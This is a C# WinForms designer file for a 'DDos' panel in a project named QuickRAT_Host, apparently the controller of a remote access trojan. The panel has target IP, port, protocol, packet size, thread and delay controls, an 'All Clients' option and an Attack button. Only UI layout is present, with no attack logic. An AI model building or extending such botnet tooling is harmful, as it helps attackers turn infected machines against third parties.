
namespace QuickRAT_Host
{
    partial class DDos
    {
        /// <summary> 
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary> 
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Component Designer generated code

        /// <summary> 
        /// Required method for Designer support - do not modify 
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.panel1 = new System.Windows.Forms.Panel();
            this.label1 = new System.Windows.Forms.Label();
            this.guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
            this.port = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.allclients = new Guna.UI2.WinForms.Guna2CheckBox();
            this.protocolselector = new Guna.UI2.WinForms.Guna2ComboBox();
            this.attackbtn = new Guna.UI2.WinForms.Guna2Button();
            this.checktargetbtn = new Guna.UI2.WinForms.Guna2Button();
            this.stopbtn = new Guna.UI2.WinForms.Guna2Button();
            this.guna2NumericUpDown2 = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.portlabel = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.packetsizelabel = new System.Windows.Forms.Label();
            this.iplabel = new System.Windows.Forms.Label();
            this.attackdelay = new Guna.UI2.WinForms.Guna2TrackBar();
            this.attackthreads = new Guna.UI2.WinForms.Guna2TrackBar();
            this.threadslabel = new System.Windows.Forms.Label();
            this.delaylabel = new System.Windows.Forms.Label();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.port)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2NumericUpDown2)).BeginInit();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.panel1.Controls.Add(this.label1);
            this.panel1.Location = new System.Drawing.Point(0, 0);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(1000, 40);
            this.panel1.TabIndex = 0;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Segoe UI", 18F, System.Drawing.FontStyle.Bold);
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(462, 3);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(77, 32);
            this.label1.TabIndex = 19;
            this.label1.Text = "DDos";
            // 
            // guna2TextBox1
            // 
            this.guna2TextBox1.Animated = true;
            this.guna2TextBox1.BackColor = System.Drawing.Color.Transparent;
            this.guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2TextBox1.BorderRadius = 5;
            this.guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.guna2TextBox1.DefaultText = "";
            this.guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.guna2TextBox1.DisabledState.Parent = this.guna2TextBox1;
            this.guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.guna2TextBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.Aqua;
            this.guna2TextBox1.FocusedState.Parent = this.guna2TextBox1;
            this.guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 8F);
            this.guna2TextBox1.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.Aqua;
            this.guna2TextBox1.HoverState.Parent = this.guna2TextBox1;
            this.guna2TextBox1.Location = new System.Drawing.Point(14, 83);
            this.guna2TextBox1.Name = "guna2TextBox1";
            this.guna2TextBox1.PasswordChar = '\0';
            this.guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Gray;
            this.guna2TextBox1.PlaceholderText = "IP";
            this.guna2TextBox1.SelectedText = "";
            this.guna2TextBox1.ShadowDecoration.Parent = this.guna2TextBox1;
            this.guna2TextBox1.Size = new System.Drawing.Size(200, 36);
            this.guna2TextBox1.TabIndex = 28;
            // 
            // port
            // 
            this.port.BackColor = System.Drawing.Color.Transparent;
            this.port.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.port.BorderRadius = 5;
            this.port.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.port.DisabledState.Parent = this.port;
            this.port.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.port.FocusedState.BorderColor = System.Drawing.Color.Aqua;
            this.port.FocusedState.Parent = this.port;
            this.port.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.port.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(254)))));
            this.port.Location = new System.Drawing.Point(230, 83);
            this.port.Maximum = new decimal(new int[] {
            65535,
            0,
            0,
            0});
            this.port.Name = "port";
            this.port.ShadowDecoration.Parent = this.port;
            this.port.Size = new System.Drawing.Size(100, 36);
            this.port.TabIndex = 31;
            this.port.UpDownButtonFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.port.UpDownButtonForeColor = System.Drawing.Color.White;
            this.port.UseTransparentBackground = true;
            // 
            // allclients
            // 
            this.allclients.Animated = true;
            this.allclients.AutoSize = true;
            this.allclients.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.allclients.CheckedState.BorderRadius = 0;
            this.allclients.CheckedState.BorderThickness = 0;
            this.allclients.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.allclients.CheckMarkColor = System.Drawing.Color.Lime;
            this.allclients.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.allclients.ForeColor = System.Drawing.Color.White;
            this.allclients.Location = new System.Drawing.Point(14, 135);
            this.allclients.Name = "allclients";
            this.allclients.Size = new System.Drawing.Size(88, 23);
            this.allclients.TabIndex = 35;
            this.allclients.Text = "All Clients";
            this.allclients.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.allclients.UncheckedState.BorderRadius = 0;
            this.allclients.UncheckedState.BorderThickness = 0;
            this.allclients.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            // 
            // protocolselector
            // 
            this.protocolselector.BackColor = System.Drawing.Color.Transparent;
            this.protocolselector.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.protocolselector.BorderRadius = 5;
            this.protocolselector.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.protocolselector.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.protocolselector.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.protocolselector.FocusedColor = System.Drawing.Color.Aqua;
            this.protocolselector.FocusedState.BorderColor = System.Drawing.Color.Aqua;
            this.protocolselector.FocusedState.Parent = this.protocolselector;
            this.protocolselector.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.protocolselector.ForeColor = System.Drawing.Color.White;
            this.protocolselector.HoverState.Parent = this.protocolselector;
            this.protocolselector.ItemHeight = 30;
            this.protocolselector.ItemsAppearance.Parent = this.protocolselector;
            this.protocolselector.Location = new System.Drawing.Point(346, 83);
            this.protocolselector.Name = "protocolselector";
            this.protocolselector.ShadowDecoration.Parent = this.protocolselector;
            this.protocolselector.Size = new System.Drawing.Size(120, 36);
            this.protocolselector.TabIndex = 36;
            // 
            // attackbtn
            // 
            this.attackbtn.Animated = true;
            this.attackbtn.AnimatedGIF = true;
            this.attackbtn.BorderRadius = 5;
            this.attackbtn.CheckedState.Parent = this.attackbtn;
            this.attackbtn.CustomImages.Parent = this.attackbtn;
            this.attackbtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.attackbtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.attackbtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.attackbtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.attackbtn.DisabledState.Parent = this.attackbtn;
            this.attackbtn.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.attackbtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.attackbtn.ForeColor = System.Drawing.Color.White;
            this.attackbtn.HoverState.Parent = this.attackbtn;
            this.attackbtn.Location = new System.Drawing.Point(700, 427);
            this.attackbtn.Name = "attackbtn";
            this.attackbtn.PressedDepth = 0;
            this.attackbtn.ShadowDecoration.Parent = this.attackbtn;
            this.attackbtn.Size = new System.Drawing.Size(120, 45);
            this.attackbtn.TabIndex = 40;
            this.attackbtn.Text = "Attack";
            // 
            // checktargetbtn
            // 
            this.checktargetbtn.Animated = true;
            this.checktargetbtn.AnimatedGIF = true;
            this.checktargetbtn.BorderRadius = 5;
            this.checktargetbtn.CheckedState.Parent = this.checktargetbtn;
            this.checktargetbtn.CustomImages.Parent = this.checktargetbtn;
            this.checktargetbtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.checktargetbtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.checktargetbtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.checktargetbtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.checktargetbtn.DisabledState.Parent = this.checktargetbtn;
            this.checktargetbtn.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.checktargetbtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.checktargetbtn.ForeColor = System.Drawing.Color.White;
            this.checktargetbtn.HoverState.Parent = this.checktargetbtn;
            this.checktargetbtn.Location = new System.Drawing.Point(14, 427);
            this.checktargetbtn.Name = "checktargetbtn";
            this.checktargetbtn.PressedDepth = 0;
            this.checktargetbtn.ShadowDecoration.Parent = this.checktargetbtn;
            this.checktargetbtn.Size = new System.Drawing.Size(120, 45);
            this.checktargetbtn.TabIndex = 41;
            this.checktargetbtn.Text = "Check Target";
            // 
            // stopbtn
            // 
            this.stopbtn.Animated = true;
            this.stopbtn.AnimatedGIF = true;
            this.stopbtn.BorderRadius = 5;
            this.stopbtn.CheckedState.Parent = this.stopbtn;
            this.stopbtn.CustomImages.Parent = this.stopbtn;
            this.stopbtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.stopbtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.stopbtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.stopbtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.stopbtn.DisabledState.Parent = this.stopbtn;
            this.stopbtn.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.stopbtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.stopbtn.ForeColor = System.Drawing.Color.White;
            this.stopbtn.HoverState.Parent = this.stopbtn;
            this.stopbtn.Location = new System.Drawing.Point(855, 427);
            this.stopbtn.Name = "stopbtn";
            this.stopbtn.PressedDepth = 0;
            this.stopbtn.ShadowDecoration.Parent = this.stopbtn;
            this.stopbtn.Size = new System.Drawing.Size(120, 45);
            this.stopbtn.TabIndex = 42;
            this.stopbtn.Text = "Stop";
            // 
            // guna2NumericUpDown2
            // 
            this.guna2NumericUpDown2.BackColor = System.Drawing.Color.Transparent;
            this.guna2NumericUpDown2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2NumericUpDown2.BorderRadius = 5;
            this.guna2NumericUpDown2.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.guna2NumericUpDown2.DisabledState.Parent = this.guna2NumericUpDown2;
            this.guna2NumericUpDown2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2NumericUpDown2.FocusedState.BorderColor = System.Drawing.Color.Aqua;
            this.guna2NumericUpDown2.FocusedState.Parent = this.guna2NumericUpDown2;
            this.guna2NumericUpDown2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2NumericUpDown2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(254)))));
            this.guna2NumericUpDown2.Location = new System.Drawing.Point(478, 83);
            this.guna2NumericUpDown2.Maximum = new decimal(new int[] {
            65535,
            0,
            0,
            0});
            this.guna2NumericUpDown2.Name = "guna2NumericUpDown2";
            this.guna2NumericUpDown2.ShadowDecoration.Parent = this.guna2NumericUpDown2;
            this.guna2NumericUpDown2.Size = new System.Drawing.Size(100, 36);
            this.guna2NumericUpDown2.TabIndex = 43;
            this.guna2NumericUpDown2.UpDownButtonFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2NumericUpDown2.UpDownButtonForeColor = System.Drawing.Color.White;
            this.guna2NumericUpDown2.UseTransparentBackground = true;
            // 
            // portlabel
            // 
            this.portlabel.AutoSize = true;
            this.portlabel.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.portlabel.ForeColor = System.Drawing.Color.White;
            this.portlabel.Location = new System.Drawing.Point(258, 61);
            this.portlabel.Name = "portlabel";
            this.portlabel.Size = new System.Drawing.Size(34, 19);
            this.portlabel.TabIndex = 46;
            this.portlabel.Text = "Port";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(373, 59);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(60, 19);
            this.label2.TabIndex = 47;
            this.label2.Text = "Protocol";
            // 
            // packetsizelabel
            // 
            this.packetsizelabel.AutoSize = true;
            this.packetsizelabel.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.packetsizelabel.ForeColor = System.Drawing.Color.White;
            this.packetsizelabel.Location = new System.Drawing.Point(489, 59);
            this.packetsizelabel.Name = "packetsizelabel";
            this.packetsizelabel.Size = new System.Drawing.Size(76, 19);
            this.packetsizelabel.TabIndex = 48;
            this.packetsizelabel.Text = "Packet Size";
            // 
            // iplabel
            // 
            this.iplabel.AutoSize = true;
            this.iplabel.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.iplabel.ForeColor = System.Drawing.Color.White;
            this.iplabel.Location = new System.Drawing.Point(48, 59);
            this.iplabel.Name = "iplabel";
            this.iplabel.Size = new System.Drawing.Size(113, 19);
            this.iplabel.TabIndex = 49;
            this.iplabel.Text = "Internet Protocol";
            // 
            // attackdelay
            // 
            this.attackdelay.HoverState.Parent = this.attackdelay;
            this.attackdelay.Location = new System.Drawing.Point(811, 88);
            this.attackdelay.Maximum = 1000;
            this.attackdelay.Name = "attackdelay";
            this.attackdelay.Size = new System.Drawing.Size(164, 23);
            this.attackdelay.TabIndex = 50;
            this.attackdelay.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.attackdelay.Value = 0;
            // 
            // attackthreads
            // 
            this.attackthreads.HoverState.Parent = this.attackthreads;
            this.attackthreads.Location = new System.Drawing.Point(592, 88);
            this.attackthreads.Maximum = 500;
            this.attackthreads.Name = "attackthreads";
            this.attackthreads.Size = new System.Drawing.Size(192, 23);
            this.attackthreads.TabIndex = 51;
            this.attackthreads.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.attackthreads.Value = 10;
            // 
            // threadslabel
            // 
            this.threadslabel.AutoSize = true;
            this.threadslabel.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.threadslabel.ForeColor = System.Drawing.Color.White;
            this.threadslabel.Location = new System.Drawing.Point(662, 66);
            this.threadslabel.Name = "threadslabel";
            this.threadslabel.Size = new System.Drawing.Size(57, 19);
            this.threadslabel.TabIndex = 52;
            this.threadslabel.Text = "Threads";
            // 
            // delaylabel
            // 
            this.delaylabel.AutoSize = true;
            this.delaylabel.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.delaylabel.ForeColor = System.Drawing.Color.White;
            this.delaylabel.Location = new System.Drawing.Point(871, 66);
            this.delaylabel.Name = "delaylabel";
            this.delaylabel.Size = new System.Drawing.Size(43, 19);
            this.delaylabel.TabIndex = 53;
            this.delaylabel.Text = "Delay";
            // 
            // DDos
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.Controls.Add(this.delaylabel);
            this.Controls.Add(this.threadslabel);
            this.Controls.Add(this.attackthreads);
            this.Controls.Add(this.attackdelay);
            this.Controls.Add(this.iplabel);
            this.Controls.Add(this.packetsizelabel);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.portlabel);
            this.Controls.Add(this.guna2NumericUpDown2);
            this.Controls.Add(this.stopbtn);
            this.Controls.Add(this.checktargetbtn);
            this.Controls.Add(this.attackbtn);
            this.Controls.Add(this.protocolselector);
            this.Controls.Add(this.allclients);
            this.Controls.Add(this.port);
            this.Controls.Add(this.guna2TextBox1);
            this.Controls.Add(this.panel1);
            this.Name = "DDos";
            this.Size = new System.Drawing.Size(1000, 490);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.port)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2NumericUpDown2)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Label label1;
        internal Guna.UI2.WinForms.Guna2TextBox guna2TextBox1;
        private Guna.UI2.WinForms.Guna2NumericUpDown port;
        private Guna.UI2.WinForms.Guna2CheckBox allclients;
        private Guna.UI2.WinForms.Guna2ComboBox protocolselector;
        private Guna.UI2.WinForms.Guna2Button attackbtn;
        private Guna.UI2.WinForms.Guna2Button checktargetbtn;
        private Guna.UI2.WinForms.Guna2Button stopbtn;
        private Guna.UI2.WinForms.Guna2NumericUpDown guna2NumericUpDown2;
        private System.Windows.Forms.Label portlabel;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label packetsizelabel;
        private System.Windows.Forms.Label iplabel;
        private Guna.UI2.WinForms.Guna2TrackBar attackdelay;
        private Guna.UI2.WinForms.Guna2TrackBar attackthreads;
        private System.Windows.Forms.Label threadslabel;
        private System.Windows.Forms.Label delaylabel;
    }
}
